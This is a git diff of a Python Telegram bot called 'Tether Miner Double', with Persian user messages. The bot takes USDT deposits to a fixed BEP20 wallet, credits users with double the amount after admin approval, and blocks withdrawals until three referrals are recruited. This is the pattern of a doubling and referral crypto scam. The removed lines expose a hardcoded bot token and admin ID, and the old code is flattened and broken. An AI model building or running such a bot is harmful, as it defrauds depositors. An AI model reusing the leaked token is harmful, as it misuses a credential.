@@ -1,4 +1,5 @@
 import logging
+import os
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     ApplicationBuilder,
@@ -9,127 +10,226 @@ from telegram.ext import (
     ConversationHandler,
     ContextTypes,
 )
---- تنظیمات اولیه ---
 
-TOKEN = "8047284110:AAGLIH-VVWRcTlwimcTQy0zimkiiBKY3vxo" ADMIN_ID = 6644712689  # آی‌دی عددی ادمین را اینجا وارد کنید
+TOKEN = os.environ.get("TOKEN")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
 
+logging.basicConfig(level=logging.INFO)
+user_data = {}
+referrals = {}
+balances = {}
+ref_bonus = {}
 
-(DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WITHDRAW_WALLET, SUPPORT_MESSAGE, ADMIN_REPLY) = range(6)
+DEPOSIT_AMOUNT, WITHDRAW_AMOUNT, WALLET_ADDRESS, DEPOSIT_PROOF, SUPPORT_MESSAGE, ADMIN_REPLY = range(6)
 
---- دیتابیس ساده ---
+def get_referral_link(user_id):
+    return f"https://t.me/TetherMinerDouble_Bot?start={user_id}"
 
-user_balances = {} user_requests = {} user_referrals = {} admin_reply_targets = {}
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_data.setdefault(user.id, {"balance": 0.0, "referrals": []})
+    keyboard = [
+        [InlineKeyboardButton("Deposit", callback_data="deposit")],
+        [InlineKeyboardButton("Withdrawal", callback_data="withdraw")],
+        [InlineKeyboardButton("Balance", callback_data="balance")],
+        [InlineKeyboardButton("Referral", callback_data="referral")],
+        [InlineKeyboardButton("Support", callback_data="support")]
+    ]
+    await update.message.reply_text("Welcome to Tether Miner Double!", reply_markup=InlineKeyboardMarkup(keyboard))
 
---- توابع کمکی ---
+async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
 
-def get_total_balance(user_id): main_balance = user_balances.get(user_id, 0) referrals = user_referrals.get(user_id, []) return main_balance + len(referrals) * 1.5
+    if query.data == "deposit":
+        await query.message.reply_text("چه مقدار دلار یا تتر می‌خواهید شارژ کنید؟\nحداقل واریز ۵ دلار می‌باشد.")
+        return DEPOSIT_AMOUNT
 
---- /start ---
+    elif query.data == "withdraw":
+        referral_count = len(user_data.get(user_id, {}).get("referrals", []))
+        if referral_count < 3:
+            await query.message.reply_text(
+                f"برای برداشت موجودی خود باید حداقل ۳ زیرمجموعه داشته باشید.\nلینک دعوت شما:\n{get_referral_link(user_id)}"
+            )
+            return ConversationHandler.END
+        await query.message.reply_text("چه مقدار می‌خواهید برداشت کنید؟")
+        return WITHDRAW_AMOUNT
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE): user_id = update.message.from_user.id if context.args: referrer_id = int(context.args[0]) if referrer_id != user_id: referrals = user_referrals.setdefault(referrer_id, []) if user_id not in referrals: referrals.append(user_id)
+    elif query.data == "balance":
+        balance = balances.get(user_id, 0.0)
+        await query.message.reply_text(f"موجودی شما: {balance} دلار")
+        return ConversationHandler.END
 
-keyboard = [
-    [InlineKeyboardButton("Deposit", callback_data="deposit")],
-    [InlineKeyboardButton("Withdrawal", callback_data="withdraw")],
-    [InlineKeyboardButton("Balance", callback_data="balance")],
-    [InlineKeyboardButton("Referral", callback_data="referral")],
-    [InlineKeyboardButton("Support", callback_data="support")],
-]
-await update.message.reply_text("Welcome! Choose an option:", reply_markup=InlineKeyboardMarkup(keyboard))
+    elif query.data == "referral":
+        ref_link = get_referral_link(user_id)
+        ref_count = len(user_data.get(user_id, {}).get("referrals", []))
+        bonus = ref_count * 1.5
+        total_balance = balances.get(user_id, 0.0) + bonus
+        balances[user_id] = total_balance
+        await query.message.reply_text(
+            f"لینک دعوت شما:\n{ref_link}\nتعداد زیرمجموعه: {ref_count}\nبه ازای هر زیرمجموعه ۱.۵ دلار دریافت می‌کنید.\nموجودی کل شما: {total_balance} دلار"
+        )
+        return ConversationHandler.END
 
---- منو ---
+    elif query.data == "support":
+        await query.message.reply_text("پیغام خود را ارسال کنید:")
+        return SUPPORT_MESSAGE
 
-async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): query = update.callback_query if query.data == "deposit": await query.message.reply_text("چه مقدار دلار یا تتر می‌خواهید شارژ کنید؟ (حداقل ۵ دلار)") return DEPOSIT_AMOUNT elif query.data == "withdraw": return await handle_withdrawal(update, context) elif query.data == "balance": user_id = query.from_user.id balance = get_total_balance(user_id) await query.message.reply_text(f"موجودی کل شما: {balance} دلار") elif query.data == "referral": return await handle_referral(update, context) elif query.data == "support": return await handle_support(update, context) return ConversationHandler.END
+async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    try:
+        amount = float(update.message.text)
+        if amount < 5:
+            await update.message.reply_text("حداقل واریز ۵ دلار می‌باشد.")
+            return ConversationHandler.END
+        context.user_data["deposit_amount"] = amount
+        await update.message.reply_text(
+            "لطفاً مبلغ را به آدرس زیر واریز کرده و لینک تراکنش یا اسکرین‌شات ارسال کنید:\n"
+            "آدرس کیف پول (BEP20): 0xcD3FcEf99251771a3dc1F6Aa992ff23f1824a1bB"
+        )
+        return DEPOSIT_PROOF
+    except ValueError:
+        await update.message.reply_text("لطفاً یک عدد معتبر وارد کنید.")
+        return ConversationHandler.END
 
---- Deposit ---
+async def deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    amount = context.user_data.get("deposit_amount", 0)
+    proof = update.message.text or (update.message.photo[-1].file_id if update.message.photo else "")
+    keyboard = [
+        [InlineKeyboardButton("تایید", callback_data=f"confirm_deposit_{user_id}_{amount}")],
+        [InlineKeyboardButton("رد", callback_data=f"reject_deposit_{user_id}")]
+    ]
+    await context.bot.send_message(
+        chat_id=ADMIN_ID,
+        text=f"درخواست واریز:\nکاربر: {user_id}\nمقدار: {amount}\nمدرک:\n{proof}",
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+    await update.message.reply_text("درخواست شما در حال بررسی است.")
+    return ConversationHandler.END
 
-async def receive_amount(update: Update, context: ContextTypes.DEFAULT_TYPE): try: amount = float(update.message.text) if amount < 5: await update.message.reply_text("حداقل مبلغ واریز ۵ دلار است.") return ConversationHandler.END context.user_data['deposit_amount'] = amount await update.message.reply_text( "آدرس کیف پول تتر (BEP20):\n" "0xcD3FcEf99251771a3dc1F6Aa992ff23f1824a1bB\n" "لطفاً لینک یا اسکرین شات تراکنش را ارسال کنید." ) return DEPOSIT_PROOF except ValueError: await update.message.reply_text("لطفاً یک عدد معتبر وارد کنید.") return DEPOSIT_AMOUNT
+async def confirm_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    _, _, user_id, amount = query.data.split("_")
+    user_id = int(user_id)
+    amount = float(amount)
+    balances[user_id] = balances.get(user_id, 0.0) + (amount * 2)
+    await context.bot.send_message(chat_id=user_id, text=f"تراکنش شما تایید شد. موجودی شما: {balances[user_id]} دلار")
+    await query.message.delete()
 
-async def receive_proof(update: Update, context: ContextTypes.DEFAULT_TYPE): user_id = update.message.from_user.id amount = context.user_data['deposit_amount']
+async def reject_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    _, _, user_id = query.data.split("_")
+    user_id = int(user_id)
+    await context.bot.send_message(chat_id=user_id, text="تراکنش شما رد شد.")
+    await query.message.delete()
 
-keyboard = [
-    [InlineKeyboardButton("تأیید", callback_data=f"confirm_deposit_{user_id}_{amount}"),
-     InlineKeyboardButton("رد", callback_data=f"reject_deposit_{user_id}")]
-]
+async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        amount = float(update.message.text)
+        user_id = update.effective_user.id
+        if amount > balances.get(user_id, 0.0):
+            await update.message.reply_text("مقدار درخواستی بیشتر از موجودی شما می‌باشد.")
+            return ConversationHandler.END
+        context.user_data["withdraw_amount"] = amount
+        await update.message.reply_text("لطفاً آدرس کیف پول تتر شبکه BEP20 خود را وارد کنید:")
+        return WALLET_ADDRESS
+    except ValueError:
+        await update.message.reply_text("لطفاً عدد معتبری وارد کنید.")
+        return ConversationHandler.END
 
-await context.bot.send_message(
-    chat_id=ADMIN_ID,
-    text=f"درخواست واریز {amount}$ از {user_id}",
-    reply_markup=InlineKeyboardMarkup(keyboard)
-)
-await update.message.reply_text("درخواست شما ارسال شد و در حال بررسی است.")
-return ConversationHandler.END
+async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    address = update.message.text
+    amount = context.user_data["withdraw_amount"]
+    keyboard = [
+        [InlineKeyboardButton("تایید", callback_data=f"confirm_withdraw_{user_id}_{amount}_{address}")],
+        [InlineKeyboardButton("رد", callback_data=f"reject_withdraw_{user_id}")]
+    ]
+    await context.bot.send_message(
+        chat_id=ADMIN_ID,
+        text=f"درخواست برداشت:\nکاربر: {user_id}\nمقدار: {amount}\nآدرس: {address}",
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+    await update.message.reply_text("درخواست شما برای بررسی ارسال شد.")
+    return ConversationHandler.END
 
-async def handle_admin_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE): query = update.callback_query await query.answer() if "confirm_deposit" in query.data: , user_id, amount = query.data.split("") user_id, amount = int(user_id), float(amount) user_balances[user_id] = user_balances.get(user_id, 0) + amount * 2 await context.bot.send_message(user_id, f"تراکنش شما تایید شد. موجودی شما {amount * 2}$ می‌باشد.") await query.edit_message_text("واریز تایید شد.") elif "reject_deposit" in query.data: , user_id = query.data.split("") await context.bot.send_message(int(user_id), "تراکنش شما رد شد.") await query.edit_message_text("واریز رد شد.")
+async def confirm_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    _, _, user_id, amount, _ = query.data.split("_", 4)
+    user_id = int(user_id)
+    amount = float(amount)
+    balances[user_id] -= amount
+    await context.bot.send_message(chat_id=user_id, text="درخواست شما تایید شد و بزودی مبلغ واریز خواهد شد.")
+    await query.message.delete()
 
---- Withdrawal ---
+async def reject_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    _, _, user_id = query.data.split("_")
+    user_id = int(user_id)
+    await context.bot.send_message(chat_id=user_id, text="درخواست برداشت شما رد شد. جهت اطلاعات بیشتر با ادمین تماس بگیرید.")
+    await query.message.delete()
 
-async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE): query = update.callback_query await query.answer() user_id = query.from_user.id if len(user_referrals.get(user_id, [])) < 3: link = f"https://t.me/TetherMinerDouble_Bot?start={user_id}" await query.message.reply_text( f"برای برداشت باید حداقل ۳ زیرمجموعه داشته باشید.\nلینک دعوت شما:\n{link}" ) return ConversationHandler.END await query.message.reply_text("چه مقدار می‌خواهید برداشت کنید؟") return WITHDRAW_AMOUNT
+async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    msg = update.message.text
+    keyboard = [
+        [InlineKeyboardButton("پاسخ", callback_data=f"reply_support_{user_id}")]
+    ]
+    await context.bot.send_message(chat_id=ADMIN_ID, text=f"پیام از کاربر {user_id}:\n{msg}", reply_markup=InlineKeyboardMarkup(keyboard))
+    await update.message.reply_text("پیام شما به ادمین ارسال شد.")
+    return ConversationHandler.END
 
-async def receive_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE): user_id = update.message.from_user.id try: amount = float(update.message.text) if amount > get_total_balance(user_id): await update.message.reply_text("مقدار درخواستی بیشتر از موجودی شما می‌باشد.") return ConversationHandler.END context.user_data['withdraw_amount'] = amount await update.message.reply_text("آدرس کیف پول خود را وارد کنید:") return WITHDRAW_WALLET except: await update.message.reply_text("لطفاً عدد معتبر وارد کنید.") return WITHDRAW_AMOUNT
+async def reply_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    context.user_data["reply_to_user"] = int(query.data.split("_")[-1])
+    await query.message.reply_text("متن پاسخ را وارد کنید:")
+    return ADMIN_REPLY
 
-async def receive_wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE): user_id = update.message.from_user.id amount = context.user_data['withdraw_amount'] wallet = update.message.text user_requests[user_id] = {'amount': amount, 'wallet': wallet}
+async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    reply_text = update.message.text
+    reply_to = context.user_data.get("reply_to_user")
+    if reply_to:
+        await context.bot.send_message(chat_id=reply_to, text=f"پاسخ ادمین:\n{reply_text}")
+        await update.message.reply_text("پاسخ ارسال شد.")
+    return ConversationHandler.END
 
-keyboard = [
-    [InlineKeyboardButton("تأیید", callback_data=f"confirm_withdraw_{user_id}"),
-     InlineKeyboardButton("رد", callback_data=f"reject_withdraw_{user_id}")]
-]
+async def handle_referrals(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if context.args:
+        referrer_id = int(context.args[0])
+        new_user_id = update.effective_user.id
+        if new_user_id != referrer_id:
+            user_data.setdefault(referrer_id, {"referrals": []})
+            if new_user_id not in user_data[referrer_id]["referrals"]:
+                user_data[referrer_id]["referrals"].append(new_user_id)
 
-await context.bot.send_message(
-    chat_id=ADMIN_ID,
-    text=f"درخواست برداشت {amount}$ از {user_id}\nآدرس: {wallet}",
-    reply_markup=InlineKeyboardMarkup(keyboard)
-)
-await update.message.reply_text("درخواست شما ارسال شد.")
-return ConversationHandler.END
+def main():
+    app = ApplicationBuilder().token(TOKEN).build()
 
-async def handle_admin_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE): query = update.callback_query await query.answer() user_id = int(query.data.split("_")[-1])
+    conv_handler = ConversationHandler(
+        entry_points=[CallbackQueryHandler(button)],
+        states={
+            DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)],
+            DEPOSIT_PROOF: [MessageHandler(filters.ALL, deposit_proof)],
+            WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_amount)],
+            WALLET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_address)],
+            SUPPORT_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, support_message)],
+            ADMIN_REPLY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_reply)],
+        },
+        fallbacks=[]
+    )
 
-if "confirm_withdraw" in query.data:
-    amount = user_requests[user_id]['amount']
-    user_balances[user_id] -= amount
-    await context.bot.send_message(user_id, "درخواست شما تایید شد. مبلغ بزودی ارسال خواهد شد.")
-    await query.edit_message_text("برداشت تایید شد.")
-elif "reject_withdraw" in query.data:
-    await context.bot.send_message(user_id, "درخواست شما رد شد. جهت اطلاعات بیشتر با ادمین تماس بگیرید.")
-    await query.edit_message_text("برداشت رد شد.")
-user_requests.pop(user_id, None)
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("start", handle_referrals))
+    app.add_handler(conv_handler)
+    app.add_handler(CallbackQueryHandler(confirm_deposit, pattern=r"^confirm_deposit_"))
+    app.add_handler(CallbackQueryHandler(reject_deposit, pattern=r"^reject_deposit_"))
+    app.add_handler(CallbackQueryHandler(confirm_withdraw, pattern=r"^confirm_withdraw_"))
+    app.add_handler(CallbackQueryHandler(reject_withdraw, pattern=r"^reject_withdraw_"))
+    app.add_handler(CallbackQueryHandler(reply_support, pattern=r"^reply_support_"))
 
---- Referral ---
+    app.run_polling()
 
-async def handle_referral(update: Update, context: ContextTypes.DEFAULT_TYPE): query = update.callback_query user_id = query.from_user.id count = len(user_referrals.get(user_id, [])) total_balance = get_total_balance(user_id) link = f"https://t.me/TetherMinerDouble_Bot?start={user_id}" await query.message.reply_text( f"لینک دعوت شما:\n{link}\nزیرمجموعه‌ها: {count}\n" f"پاداش: ۱.۵ دلار برای هر نفر\nموجودی کل: {total_balance} دلار" ) return ConversationHandler.END
-
---- Support ---
-
-async def handle_support(update: Update, context: ContextTypes.DEFAULT_TYPE): query = update.callback_query await query.message.reply_text("پیام خود را برای پشتیبانی ارسال کنید:") return SUPPORT_MESSAGE
-
-async def receive_support_message(update: Update, context: ContextTypes.DEFAULT_TYPE): user = update.message.from_user keyboard = [[InlineKeyboardButton("پاسخ", callback_data=f"reply_to_{user.id}")]] await context.bot.send_message( chat_id=ADMIN_ID, text=f"پیام از {user.first_name} ({user.id}):\n{update.message.text}", reply_markup=InlineKeyboardMarkup(keyboard) ) await update.message.reply_text("پیام شما ارسال شد.") return ConversationHandler.END
-
-async def handle_admin_reply_button(update: Update, context: ContextTypes.DEFAULT_TYPE): query = update.callback_query target_user_id = int(query.data.split("_")[-1]) admin_reply_targets[query.from_user.id] = target_user_id await query.message.reply_text("متن پاسخ را وارد کنید:") return ADMIN_REPLY
-
-async def receive_admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE): admin_id = update.message.from_user.id user_id = admin_reply_targets.pop(admin_id, None) if user_id: await context.bot.send_message(user_id, f"پاسخ پشتیبانی:\n{update.message.text}") await update.message.reply_text("پاسخ شما ارسال شد.") return ConversationHandler.END
-
-
-if name == 'main': logging.basicConfig(level=logging.INFO) app = ApplicationBuilder().token(TOKEN).build()
-
-conv_handler = ConversationHandler(
-    entry_points=[CallbackQueryHandler(menu_handler)],
-    states={
-        DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT, receive_amount)],
-        DEPOSIT_PROOF: [MessageHandler(filters.ALL, receive_proof)],
-        WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT, receive_withdraw_amount)],
-        WITHDRAW_WALLET: [MessageHandler(filters.TEXT, receive_wallet_address)],
-        SUPPORT_MESSAGE: [MessageHandler(filters.TEXT, receive_support_message)],
-        ADMIN_REPLY: [MessageHandler(filters.TEXT, receive_admin_reply)],
-    },
-    fallbacks=[]
-)
-
-app.add_handler(CommandHandler("start", start))
-app.add_handler(conv_handler)
-app.add_handler(CallbackQueryHandler(handle_admin_deposit, pattern="confirm_deposit|reject_deposit"))
-app.add_handler(CallbackQueryHandler(handle_admin_withdraw, pattern="confirm_withdraw|reject_withdraw"))
-app.add_handler(CallbackQueryHandler(handle_admin_reply_button, pattern="reply_to_"))
-
-app.run_polling()
-
+if __name__ == "__main__":
+    main()
